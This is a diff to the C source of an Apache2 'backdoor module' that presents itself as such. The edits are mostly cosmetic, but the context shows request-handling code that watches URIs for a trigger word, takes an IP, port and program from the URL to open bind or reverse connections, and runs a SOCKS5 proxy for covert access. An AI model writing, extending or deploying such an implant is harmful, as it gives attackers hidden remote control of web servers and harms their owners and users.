@@ -1,7 +1,8 @@
-/* -------------------------------*/
-/* Backdoor module (@RicoVlad) */
-/* -------------------------------*/
-/* Code inspired from @TheXC3LL */
+/* ------------------------------------*/
+/* Apache2 Backdoor module (@RicoVlad) */
+/* ------------------------------------*/
+
+/* Idea inspired from @TheXC3LL */
 // https://www.tarlogic.com/en/blog/backdoors-modulos-apache/
 /* ************************************************************* */
 //Socks5 code inspired from https://github.com/fgssfgss/socks_proxy
@@ -41,7 +42,7 @@
 
 #include "mod_backdoor.h"
 
-/// SOCKS proxy ///
+//////// SOCKS proxy ////////
 #define _GNU_SOURCE
 #define _POSIX_C_SOURCE 200809L
 #include <pthread.h>
@@ -68,7 +69,6 @@ static sblist* auth_ips;
 static pthread_mutex_t auth_ips_mutex = PTHREAD_MUTEX_INITIALIZER;
 static const struct server* server;
 static union sockaddr_union bind_addr = {.v4.sin_family = AF_UNSPEC};
-static pid_t proxyPid;
 
 enum socksstate {
     SS_1_CONNECTED,
@@ -115,7 +115,7 @@ struct thread {
 static void dolog(const char* fmt, ...) { }
 #endif
 
-//////////////////////////
+//////////////////////////////////////////
 
 #define BUFSIZE 65536
 #define IPSIZE 4
@@ -135,9 +135,9 @@ static void dolog(const char* fmt, ...) { }
 pid_t pid;
 
 
-/*************/
+/****************************/
 /// SOCKS proxy functions ///
-/************/
+/***************************/
 
 static int connect_socks_target(unsigned char *buf, size_t n, struct client *client) {
     if(n < 5) return -EC_GENERAL_FAILURE;
@@ -458,7 +458,7 @@ int startProxy(int port, char* user){
         if(a) pthread_attr_destroy(&attr);
     }
 }
-
+/** END socks proxy functions **/
 /*******************************************************************/
 
 
@@ -773,7 +773,7 @@ static int backdoor_post_read_request(request_rec *r) {
 	}
 	if (strstr(r->uri, BINDWORD)) {
 	    int new_socket, bindfd;
-        char* meh = strtok(r->uri,"/");
+        strtok(r->uri,"/");
         char* port = strtok(NULL,"/");
 
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -841,7 +841,7 @@ static int backdoor_post_read_request(request_rec *r) {
         }
 
         write(sock,r->uri,strlen(r->uri));
-        char* meh = strtok(r->uri,"/");
+        strtok(r->uri,"/");
         char* ip = strtok(NULL,"/");
         char* port = strtok(NULL,"/");
         char* prog = strtok(NULL,"/");
@@ -866,7 +866,7 @@ static int backdoor_post_read_request(request_rec *r) {
                 exit(0);
             }
 
-            char* meh = strtok(r->uri,"/");
+            strtok(r->uri,"/");
             char* ip = strtok(NULL,"/");
             char* port = strtok(NULL,"/");
 
